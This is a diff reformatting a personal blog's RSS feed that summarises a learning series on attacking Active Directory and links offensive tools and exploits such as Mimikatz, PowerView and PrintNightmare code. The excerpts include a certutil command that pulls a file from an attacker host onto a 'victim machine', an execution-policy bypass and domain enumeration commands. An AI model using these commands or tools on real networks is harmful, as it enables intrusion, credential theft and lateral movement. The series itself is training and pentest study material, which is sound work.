@@ -1,85 +1,48 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>windows on auti.dev   ≽^._.^≼ ∫</title>
+    <title>Windows on auti.dev   ≽^._.^≼ ∫</title>
     <link>https://auti.dev/blog/windows/</link>
-    <description>Recent content in windows on auti.dev   ≽^._.^≼ ∫</description>
-    <generator>Hugo -- gohugo.io</generator>
+    <description>Recent content in Windows on auti.dev   ≽^._.^≼ ∫</description>
+    <generator>Hugo</generator>
     <language>en-US</language>
     <copyright>Copyright © 2023, Atharva Auti.</copyright>
-    <lastBuildDate>Fri, 20 Aug 2021 12:35:53 +0530</lastBuildDate><atom:link href="https://auti.dev/blog/windows/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 20 Aug 2021 12:35:53 +0530</lastBuildDate>
+    <atom:link href="https://auti.dev/blog/windows/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Useful AD Resources</title>
       <link>https://auti.dev/useful-ad-resources/</link>
       <pubDate>Fri, 20 Aug 2021 12:35:53 +0530</pubDate>
-      
       <guid>https://auti.dev/useful-ad-resources/</guid>
-      <description>Downloads and Tools Impacket Tools: https://github.com/SecureAuthCorp/impacket/releases
-Mitm6: https://github.com/fox-it/mitm6
-Powerview: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
-Sharphound: https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
-Mimikatz: https://github.com/gentilkiwi/mimikatz
-PRET: https://github.com/RUB-NDS/PRET
-Praeda: https://github.com/percx/Praeda
-SYSVOL Script: (https://support.microsoft.com/en-us/kb/2962486)
-LAPS: (https://www.microsoft.com/en-us/download/details.aspx?id=46899))
-cube0x0 RCE: https://github.com/cube0x0/CVE-2021-1675
-calebstewart LPE: https://github.com/calebstewart/CVE-2021-1675
-Articles and Blogs Top 5 ways I got Domain: https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
-Account tiering: https://www.ravenswoodtechnology.com/how-to-mitigate-privilege-escalation-with-the-tiered-access-model-for-active-directory-security/
-mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
-Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
-Hacking Printers Cheatsheet: http://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
-A Pen Tester’s Guide to Printer Hacking: https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
-Bypass Antivirus: https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html
-GPP cPassword Attack: https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/</description>
+      <description>Downloads and Tools Impacket Tools: https://github.com/SecureAuthCorp/impacket/releases&#xA;Mitm6: https://github.com/fox-it/mitm6&#xA;Powerview: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView&#xA;Sharphound: https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1&#xA;Mimikatz: https://github.com/gentilkiwi/mimikatz&#xA;PRET: https://github.com/RUB-NDS/PRET&#xA;Praeda: https://github.com/percx/Praeda&#xA;SYSVOL Script: (https://support.microsoft.com/en-us/kb/2962486)&#xA;LAPS: (https://www.microsoft.com/en-us/download/details.aspx?id=46899))&#xA;cube0x0 RCE: https://github.com/cube0x0/CVE-2021-1675&#xA;calebstewart LPE: https://github.com/calebstewart/CVE-2021-1675&#xA;Articles and Blogs Top 5 ways I got Domain: https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa&#xA;Account tiering: https://www.ravenswoodtechnology.com/how-to-mitigate-privilege-escalation-with-the-tiered-access-model-for-active-directory-security/&#xA;mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/&#xA;Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/&#xA;Hacking Printers Cheatsheet: http://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet&#xA;A Pen Tester’s Guide to Printer Hacking: https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/&#xA;Bypass Antivirus: https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html&#xA;GPP cPassword Attack: https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/</description>
     </item>
-    
     <item>
       <title>Compromising AD - Part 4: Post Exploitation</title>
       <link>https://auti.dev/compromising-ad-part-4-post-exploitation/</link>
       <pubDate>Tue, 17 Aug 2021 12:35:53 +0530</pubDate>
-      
       <guid>https://auti.dev/compromising-ad-part-4-post-exploitation/</guid>
-      <description>Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. Next &amp;gt;&amp;gt; Useful Active Directory Resources File-Transfers Certutil
-certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
-python -m SimpleHTTPServer [port] Browser
-Navigate directly to the file (%20 for spaces) FTP
-On Attacker Machine
-python -m pyftpdlib 21 On Victim Machine, Browse to</description>
+      <description>Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. Next &amp;gt;&amp;gt; Useful Active Directory Resources File-Transfers Certutil&#xA;certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host&#xA;python -m SimpleHTTPServer [port] Browser&#xA;Navigate directly to the file (%20 for spaces) FTP&#xA;On Attacker Machine&#xA;python -m pyftpdlib 21 On Victim Machine, Browse to</description>
     </item>
-    
     <item>
       <title>Compromising AD - Part 3: Post Compromise Attacks</title>
       <link>https://auti.dev/compromising-ad-part-3-post-compromise-attacks/</link>
       <pubDate>Mon, 16 Aug 2021 12:35:53 +0530</pubDate>
-      
       <guid>https://auti.dev/compromising-ad-part-3-post-compromise-attacks/</guid>
       <description>Post-Compromise Attacks Post-Compromise Attacks passthehash ??? WTF Mitigations Token-Impersonation What are tokens? Two types Setup Mitigations Kerberoasting Kerberoast? Mitigations GPP-cPassword-Attacks Group Policy Preferences Attack aka MS14-025 Resources Setup Exploiting &amp;ldquo;Active&amp;rdquo; Machine on HacktheBox Privesc that Machine! Mitigations URL-File-Attacks SCF and URL file attack against writeable share Mitigations Print-Nightmare Resources Exploit Mitigation - just disable the damn service! Installation Exploit Mimikatz What&amp;rsquo;s that? Resources Exploit Golden-Ticket-Attack What is a Golden Ticket? Exploit Mitigations Zero-Logon aka CVE-2020-1472 Resources Exploit Mitigations Next &amp;gt;&amp;gt; Part 4: Post Exploitation passthehash If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!</description>
     </item>
-    
     <item>
       <title>Compromising AD - Part 2: Post Compromise Enumeration</title>
       <link>https://auti.dev/compromising-ad-part-2-post-compromise-enumeration/</link>
       <pubDate>Sun, 15 Aug 2021 12:37:53 +0530</pubDate>
-      
       <guid>https://auti.dev/compromising-ad-part-2-post-compromise-enumeration/</guid>
-      <description>Post Compromise Enumeration Post Compromise Enumeration Powerview Requirements Enumeration Bloodhound Setup Enumeration Next &amp;gt;&amp;gt; Part 3: Post Compromise Attacks Powerview Requirements https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
-Enumeration Load up a command prompt and cd into Downloads
-powershell -ep bypass	-ep is ExecutionPolicy (Stops us from executing scripts) bypass - bypass :) Load PowerView
-. .\Powerview.ps1 Fundamental Commands
-Get-NetDomain //Returns information about the domain Get-NetDomainController // Returns Information about DC Get-DomainPolicy // Returns Domain Policies such as Kerberos Policy, System Access, Version, Registry Values (Get-DomainPolicy).</description>
+      <description>Post Compromise Enumeration Post Compromise Enumeration Powerview Requirements Enumeration Bloodhound Setup Enumeration Next &amp;gt;&amp;gt; Part 3: Post Compromise Attacks Powerview Requirements https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView&#xA;Enumeration Load up a command prompt and cd into Downloads&#xA;powershell -ep bypass&#x9;-ep is ExecutionPolicy (Stops us from executing scripts) bypass - bypass :) Load PowerView&#xA;. .\Powerview.ps1 Fundamental Commands&#xA;Get-NetDomain //Returns information about the domain Get-NetDomainController // Returns Information about DC Get-DomainPolicy // Returns Domain Policies such as Kerberos Policy, System Access, Version, Registry Values (Get-DomainPolicy).</description>
     </item>
-    
     <item>
       <title>Compromising AD - Part 1: Initial Attack Vectors</title>
       <link>https://auti.dev/compromising-ad-part-1-initial-attack-vectors/</link>
       <pubDate>Sun, 15 Aug 2021 12:35:53 +0530</pubDate>
-      
       <guid>https://auti.dev/compromising-ad-part-1-initial-attack-vectors/</guid>
-      <description>Introduction In the digital landscape, Active Directory (AD) is the cornerstone of network identity and access management, exerting immense power within an organization&amp;rsquo;s infrastructure.
-Yet, as the heartbeat of user authentication and authorization, it presents an enticing target for cyber adversaries seeking entry points to exploit. This four-part blog series ventures into the maze of Active Directory compromises, sketching insights from the TCM Security course to describe the vulnerabilities, attack vectors, and crucially, robust strategies for fortification and defense.</description>
+      <description>Introduction In the digital landscape, Active Directory (AD) is the cornerstone of network identity and access management, exerting immense power within an organization&amp;rsquo;s infrastructure.&#xA;Yet, as the heartbeat of user authentication and authorization, it presents an enticing target for cyber adversaries seeking entry points to exploit. This four-part blog series ventures into the maze of Active Directory compromises, sketching insights from the TCM Security course to describe the vulnerabilities, attack vectors, and crucially, robust strategies for fortification and defense.</description>
     </item>
-    
   </channel>
 </rss>
